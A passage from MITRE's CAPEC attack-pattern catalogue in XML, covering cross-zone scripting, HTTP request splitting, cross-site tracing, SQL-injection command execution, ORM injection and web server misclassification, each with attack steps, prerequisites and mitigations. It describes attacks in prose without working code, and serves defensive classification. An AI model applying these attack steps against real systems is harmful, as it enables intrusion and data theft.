            <Mitigation>Turn off JavaScript, Flash and disable CSS.</Mitigation>
            <Mitigation>When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>A victim has an authenticated session with a site that provides an electronic payment service to transfer funds between subscribing members. At the same time, the victim receives an e-mail that appears to come from an online publication to which he or she subscribes with links to today's news articles. The victim clicks on one of these links and is taken to a page with the news story. There is a screen with an advertisement that appears on top of the news article with the 'skip this ad' button. Eager to read the news article, the user clicks on this button. Nothing happens. The user clicks on the button one more time and still nothing happens.</xhtml:p>
               <xhtml:p>In reality, the victim activated a hidden action control located in a transparent layer above the 'skip this ad' button. The ad screen blocking the news article made it likely that the victim would click on the 'skip this ad' button. Clicking on the button, actually initiated the transfer of $1000 from the victim's account with an electronic payment service to an adversary's account. Clicking on the 'skip this ad' button the second time (after nothing seemingly happened the first time) confirmed the transfer of funds to the electronic payment service.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="1021"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Description Summary, Examples-Instances, Related_Weaknesses, Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="104" Name="Cross Zone Scripting" Abstraction="Standard" Status="Draft">
         <Description>An attacker is able to cause a victim to load content into their web-browser that bypasses security zone controls and gain access to increased privileges to execute scripting code or other web objects such as unsigned ActiveX controls or applets. This is a privilege elevation attack targeted at zone-based web-browser security. In a zone-based model, pages belong to one of a set of zones corresponding to the level of privilege assigned to that page. Pages in an untrusted zone would have a lesser level of access to the system and/or be restricted in the types of executable content it was allowed to invoke. In a cross-zone scripting attack, a page that should be assigned to a less privileged zone is granted the privileges of a more trusted zone. This can be accomplished by exploiting bugs in the browser, exploiting incorrect configuration in the zone controls, through a cross-site scripting attack that causes the attackers' content to be treated as coming from a more trusted page, or by leveraging some piece of system functionality that is accessible from both the trusted and less trusted zone. This attack differs from "Restful Privilege Escalation" in that the latter correlates to the inadequate securing of RESTful access methods (such as HTTP DELETE) on the server, while cross-zone scripting attacks the concept of security zones as implemented by a browser.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="233"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Find systems susceptible to the attack] Find systems that contain functionality that is accessed from both the internet zone and the local zone. There needs to be a way to supply input to that functionality from the internet zone and that original input needs to be used later on a page from a local zone.</Description>
               <Technique>Leverage knowledge of common local zone functionality on targeted platforms to guide attempted injection of code through relevant internet zone mechanisms. In some cases this may be due to standard system configurations enabling shared functionality between internet and local zones. The attacker can search for indicators that these standard configurations are in place.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Find the insertion point for the payload] The attacker first needs to find some system functionality or possibly another weakness in the system (e.g. susceptibility to cross site scripting) that would provide the attacker with a mechanism to deliver the payload (i.e. the code to be executed) to the user. The location from which this code is executed in the user's browser needs to be within the local machine zone.</Description>
               <Technique>Finding weaknesses in functionality used by both privileged and unprivileged users.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Craft and inject the payload] Develop the payload to be executed in the higher privileged zone in the user's browser. Inject the payload and attempt to lure the victim (if possible) into executing the functionality which unleashes the payload.</Description>
               <Technique>The attacker makes it as likely as possible that the vulnerable functionality into which he has injected the payload has a high likelihood of being used by the victim.</Technique>
               <Technique>Leverage cross-site scripting vulnerability to inject payload.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The target must be using a zone-aware browser.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Ability to craft malicious scripts or find them elsewhere and ability to identify functionality that is running web controls in the local zone and to find an injection vector into that functionality</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Disable script execution.</Mitigation>
            <Mitigation>Ensure that sufficient input validation is performed for any potentially untrusted data before it is used in any privileged context or zone</Mitigation>
            <Mitigation>Limit the flow of untrusted data into the privileged areas of the system that run in the higher trust zone</Mitigation>
            <Mitigation>Limit the sites that are being added to the local machine zone and restrict the privileges of the code running in that zone to the bare minimum</Mitigation>
            <Mitigation>Ensure proper HTML output encoding before writing user supplied data to the page</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>There was a cross zone scripting vulnerability discovered in Skype that allowed one user to upload a video with a maliciously crafted title that contains a script. Subsequently, when the victim attempts to use the "add video to chat" feature on attacker's video, the script embedded in the title of the video runs with local zone privileges. Skype is using IE web controls to render internal and external HTML pages. "Add video to chat" uses these web controls and they are running in the Local Zone. Any user who searched for the video in Skype with the same keywords as in the title field, would have the attackers' code executing in their browser with local zone privileges to their host machine (e.g. applications on the victim's host system could be executed).</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="250"/>
            <Related_Weakness CWE_ID="638"/>
            <Related_Weakness CWE_ID="285"/>
            <Related_Weakness CWE_ID="116"/>
            <Related_Weakness CWE_ID="20"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="105" Name="HTTP Request Splitting" Abstraction="Standard" Status="Draft">
         <Description>HTTP Request Splitting (also known as HTTP Request Smuggling) is an attack pattern where an attacker attempts to insert additional HTTP requests in the body of the original (enveloping) HTTP request in such a way that the browser interprets it as one request but the web server interprets it as two. There are several ways to perform HTTP request splitting attacks. One way is to include double Content-Length headers in the request to exploit the fact that the devices parsing the request may each use a different header. Another way is to submit an HTTP request with a "Transfer Encoding: chunked" in the request header set with setRequestHeader to allow a payload in the HTTP Request that can be considered as another HTTP Request by a subsequent parsing entity. A third way is to use the "Double CR in an HTTP header" technique. There are also a few less general techniques targeting specific parsing vulnerabilities in certain web servers.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="220"/>
            <Related_Attack_Pattern Nature="PeerOf" CAPEC_ID="34"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Investigate Target Environment] Determine the technologies used in the target environment such as types of browsers, web servers, application firewalls, proxies, etc.</Description>
               <Technique>Investigation of the target environment to determine the types of technologies used to parse the incoming HTTP requests. Attempt to understand how HTTP Request headers are parsed</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>[Post a malicious HTTP Request] Post a malicious HTTP request that will be interpreted as multiple HTTP requests when parsed on the server</Description>
               <Technique>Post a malicious HTTP Request utilizing double CR/LF characters in HTTP header to cause request splitting</Technique>
               <Technique>Post a malicious HTTP Request utilizing "Transfer Encoding: chunked" in the request header to cause request splitting</Technique>
               <Technique>Post a malicious HTTP Request utilizing double Content-Length headers to cause request splitting</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>User-manipulateable HTTP Request headers are processed by the web server</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Good understanding of the HTTP protocol and the parsing mechanisms employed by various web servers</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>A tool that allows for the sending of customized HTTP requests is required.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Make sure to install the latest vendor security patches available for the web server.</Mitigation>
            <Mitigation>If possible, make use of SSL.</Mitigation>
            <Mitigation>Install a web application firewall that has been secured against HTTP Request Splitting</Mitigation>
            <Mitigation>Use web servers that employ a tight HTTP parsing process</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Microsoft Internet Explorer versions 5.01 SP4 and prior, 6.0 SP2 and prior, and 7.0 contain a vulnerability that could allow an unauthenticated, remote attacker to conduct HTTP request splitting and smuggling attacks.</xhtml:p>
               <xhtml:p>The vulnerability is due to an input validation error in the browser that allows attackers to manipulate certain headers to expose the browser to HTTP request splitting and smuggling attacks. Attacks may include cross-site scripting, proxy cache poisoning, and session fixation. In certain instances, an exploit could allow the attacker to bypass web application firewalls or other filtering devices.</xhtml:p>
               <xhtml:p>Microsoft has confirmed the vulnerability and released software updates</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="436"/>
            <Related_Weakness CWE_ID="444"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns, Resources_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="107" Name="Cross Site Tracing" Abstraction="Detailed" Status="Draft">
         <Description>Cross Site Tracing (XST) enables an adversary to steal the victim's session cookie and possibly other authentication credentials transmitted in the header of the HTTP request when the victim's browser communicates to destination system's web server. The adversary first gets a malicious script to run in the victim's browser that induces the browser to initiate an HTTP TRACE request to the web server. If the destination web server allows HTTP TRACE requests, it will proceed to return a response to the victim's web browser that contains the original HTTP request in its body. The function of HTTP TRACE, as defined by the HTTP specification, is to echo the request that the web server receives from the client back to the client. Since the HTTP header of the original request had the victim's session cookie in it, that session cookie can now be picked off the HTTP TRACE response and sent to the adversary's malicious site. XST becomes relevant when direct access to the session cookie via the "document.cookie" object is disabled with the use of httpOnly attribute which ensures that the cookie can be transmitted in HTTP requests but cannot be accessed in other ways. Using SSL does not protect against XST. If the system with which the victim is interacting is susceptible to XSS, an adversary can exploit that weakness directly to get his or her malicious script to issue an HTTP TRACE request to the destination system's web server. In the absence of an XSS weakness on the site with which the victim is interacting, an adversary can get the script to come from the site that he controls and get it to execute in the victim's browser (if he can trick the victim's into visiting his malicious website or clicking on the link that he supplies). However, in that case, due to the same origin policy protection mechanism in the browser, the adversary's malicious script cannot directly issue an HTTP TRACE request to the destination system's web server because the malicious script did not originate at that domain. An adversary will then need to find a way to exploit another weakness that would enable him or her to get around the same origin policy protection.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="593"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="63"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Determine if HTTP Trace is enabled] Determine if HTTP Trace is enabled at the web server with which the victim has a an active session</Description>
               <Technique>An adversary may issue an HTTP Trace request to the target web server and observe if the response arrives with the original request in the body of the response.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Identify mechanism to launch HTTP Trace request] The adversary attempts to force the victim to issue an HTTP Trace request to the targeted application.</Description>
               <Technique>The adversary probes for cross-site scripting vulnerabilities to force the victim into issuing an HTTP Trace request.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Create a malicious script that pings the web server with HTTP TRACE request] Create a malicious script that will induce the victim's browser to issue an HTTP TRACE request to the destination system's web server. The script will further intercept the response from the web server, pick up sensitive information out of it, and forward to the site controlled by the adversary.</Description>
               <Technique>The adversary's malicious script circumvents the httpOnly cookie attribute that prevents from hijacking the victim's session cookie directly using document.cookie and instead leverages the HTTP TRACE to catch this information from the header of the HTTP request once it is echoed back from the web server in the body of the HTTP TRACE response.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Execute malicious HTTP Trace launching script] The adversary leverages a vulnerability to force the victim to execute the malicious HTTP Trace launching script</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>HTTP TRACE is enabled on the web server</Prerequisite>
            <Prerequisite>The destination system is susceptible to XSS or an adversary can leverage some other weakness to bypass the same origin policy</Prerequisite>
            <Prerequisite>Scripting is enabled in the client's browser</Prerequisite>
            <Prerequisite>HTTP is used as the communication protocol between the server and the client</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Understanding of the HTTP protocol and an ability to craft a malicious script</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Administrators should disable support for HTTP TRACE at the destination's web server. Vendors should disable TRACE by default.</Mitigation>
            <Mitigation>Patch web browser against known security origin policy bypass exploits.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>An adversary determines that a particular system is vulnerable to reflected cross-site scripting (XSS) and endeavors to leverage this weakness to steal the victim's authentication cookie. An adversary realizes that since httpOnly attribute is set on the user's cookie, it is not possible to steal it directly with his malicious script. Instead, the adversary has their script use XMLHTTP ActiveX control in the victim's IE browser to issue an HTTP TRACE to the target system's server which has HTTP TRACE enabled. The original HTTP TRACE request contains the session cookie and so does the echoed response. The adversary picks the session cookie from the body of HTTP TRACE response and ships it to the adversary. The adversary then uses the newly acquired victim's session cookie to impersonate the victim in the target system.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="693"/>
            <Related_Weakness CWE_ID="648"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-3"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="108" Name="Command Line Execution through SQL Injection" Abstraction="Detailed" Status="Draft">
         <Description>An attacker uses standard SQL injection methods to inject data into the command line for execution. This could be done directly through misuse of directives such as MSSQL_xp_cmdshell or indirectly through injection of data into the database that would be interpreted as shell commands. Sometime later, an unscrupulous backend application (or could be part of the functionality of the same application) fetches the injected data stored in the database and uses this data as command line arguments without performing proper validation. The malicious data escapes that data plane by spawning new commands to be executed on the host.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="66"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Probe for SQL Injection vulnerability] The attacker injects SQL syntax into user-controllable data inputs to search unfiltered execution of the SQL syntax in a query.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Exploit</Phase>
               <Description>[Achieve arbitrary command execution through SQL Injection with the MSSQL_xp_cmdshell directive] The attacker leverages a SQL Injection attack to inject shell code to be executed by leveraging the xp_cmdshell directive.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Inject malicious data in the database] Leverage SQL injection to inject data in the database that could later be used to achieve command injection if ever used as a command line argument</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Trigger command line execution with injected arguments] The attacker causes execution of command line functionality which leverages previously injected database content as arguments.</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The application does not properly validate data before storing in the database</Prerequisite>
            <Prerequisite>Backend application implicitly trusts the data stored in the database</Prerequisite>
            <Prerequisite>Malicious data is used on the backend as a command line argument</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">The attacker most likely has to be familiar with the internal functionality of the system to launch this attack. Without that knowledge, there are not many feedback mechanisms to give an attacker the indication of how to perform command injection or whether the attack is succeeding.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Disable MSSQL xp_cmdshell directive on the database</Mitigation>
            <Mitigation>Properly validate the data (syntactically and semantically) before writing it to the database.</Mitigation>
            <Mitigation>Do not implicitly trust the data stored in the database. Re-validate it prior to usage to make sure that it is safe to use in a given context (e.g. as a command line argument).</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>SQL injection vulnerability in Cacti 0.8.6i and earlier, when register_argc_argv is enabled, allows remote attackers to execute arbitrary SQL commands via the (1) second or (2) third arguments to cmd.php. NOTE: this issue can be leveraged to execute arbitrary commands since the SQL query results are later used in the polling_items array and popen function (CVE-2006-6799).</xhtml:p>
               <xhtml:p>Reference: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6799</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="89"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="78"/>
            <Related_Weakness CWE_ID="114"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="109" Name="Object Relational Mapping Injection" Abstraction="Detailed" Status="Draft">
         <Description>An attacker leverages a weakness present in the database access layer code generated with an Object Relational Mapping (ORM) tool or a weakness in the way that a developer used a persistence framework to inject his or her own SQL commands to be executed against the underlying database. The attack here is similar to plain SQL injection, except that the application does not use JDBC to directly talk to the database, but instead it uses a data access layer generated by an ORM tool or framework (e.g. Hibernate). While most of the time code generated by an ORM tool contains safe access methods that are immune to SQL injection, sometimes either due to some weakness in the generated code or due to the fact that the developer failed to use the generated access methods properly, SQL injection is still possible.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="66"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Determine Persistence Framework Used] An attacker tries to determine what persistence framework is used by the application in order to leverage a weakness in the generated data access layer code or a weakness in a way that the data access layer may have been used by the developer.</Description>
               <Technique>An attacker provides input to the application in an attempt to induce an error screen that reveals a stack trace that gives an indication of the automated data access layer used. Or an attacker may simply make some educated guesses and assume, for instance, that Hibernate is used and try to craft an attack from there.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Explore</Phase>
               <Description>[Probe for ORM Injection vulnerabilities] The attacker injects ORM syntax into user-controllable data inputs of the application to determine if it is possible modify data query structure and content.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Perform SQL Injection through the generated data access layer] An attacker proceeds to exploit a weakness in the generated data access methods that does not properly separate control plane from the data plan, or potentially a particular way in which developer might have misused the generated code, to modify the structure of the executed SQL queries and/or inject entirely new SQL queries.</Description>
               <Technique>An attacker uses normal SQL injection techniques and adjusts them to reflect the type of data access layer generation framework used by the application.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>An application uses data access layer generated by an ORM tool or framework</Prerequisite>
            <Prerequisite>An application uses user supplied data in queries executed against the database</Prerequisite>
            <Prerequisite>The separation between data plane and control plane is not ensured, through either developer error or an underlying weakness in the data access layer code generation framework</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Knowledge of general SQL injection techniques and subtleties of the ORM framework is needed</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>None: No specialized resources are required to execute this type of attack.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Remember to understand how to use the data access methods generated by the ORM tool / framework properly in a way that would leverage the built-in security mechanisms of the framework</Mitigation>
            <Mitigation>Ensure to keep up to date with security relevant updates to the persistence framework used within your application.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>When using Hibernate, it is possible to use the session.find() method to run queries against the database. This is an overloaded method that provides facilities to perform binding between the supplied user data and place holders in the statically defined query. However, it is also possible to use the session.find() method without using any of these query binding overloads, hence effectively concatenating the user supplied data with rest of the SQL query, resulting in a possibility for SQL injection. While the framework may provide mechanisms to use methods immune to SQL injections, it may also contain ways that are not immune that may be chosen by the developer.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="100"/>
            <Related_Weakness CWE_ID="89"/>
            <Related_Weakness CWE_ID="564"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-4" Section="Testing for ORM Injection (OWASP-DV-007)"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Resources_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="11" Name="Cause Web Server Misclassification" Abstraction="Detailed" Status="Draft">
         <Description>An attack of this type exploits a Web server's decision to take action based on filename or file extension. Because different file types are handled by different server processes, misclassification may force the Web server to take unexpected action, or expected actions in an unexpected sequence. This may cause the server to exhaust resources, supply debug or system data to the attacker, or bind an attacker to a remote process. This type of vulnerability has been found in many widely used servers including IIS, Lotus Domino, and Orion. The attacker's job in this case is straightforward, standard communication protocols and methods are used and are generally appended with malicious information at the tail end of an otherwise legitimate request. The attack payload varies, but it could be special characters like a period or simply appending a tag that has a special meaning for operations on the server side like .jsp for a java application server. The essence of this attack is that the attacker deceives the server into executing functionality based on the name of the request, i.e. login.jsp, not the contents.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="635"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Footprint file input vectors] Manually or using an automated tool, an attacker searches for all input locations where a user has control over the filenames or MIME types of files submitted to the web server.</Description>
               <Technique>Attacker manually crawls application to identify file inputs</Technique>
               <Technique>Attacker uses an automated tool to crawl application identify file inputs</Technique>
               <Technique>Attacker manually assesses strength of access control protecting native application files from user control</Technique>
               <Technique>Attacker explores potential for submitting files directly to the web server via independently constructed HTTP Requests</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[File misclassification shotgunning] An attacker makes changes to file extensions and MIME types typically processed by web servers and looks for abnormal behavior.</Description>
               <Technique>Attacker submits files with switched extensions (e.g. .php on a .jsp file) to web server.</Technique>
               <Technique>Attacker adds extra characters (e.g. adding an extra . after the file extension) to filenames of files submitted to web server.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Experiment</Phase>
               <Description>[File misclassification sniping] Understanding how certain file types are processed by web servers, an attacker crafts varying file payloads and modifies their file extension or MIME type to be that of the targeted type to see if the web server is vulnerable to misclassification of that type.</Description>
               <Technique>Craft a malicious file payload, modify file extension to the targeted file type and submit it to the web server.</Technique>
               <Technique>Craft a malicious file payload, modify its associated MIME type to the targeted file type and submit it to the web server.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Disclose information] The attacker, by manipulating a file extension or MIME type is able to make the web server return raw information (not executed).</Description>
               <Technique>Manipulate the file names that are explicitly sent to the server.</Technique>
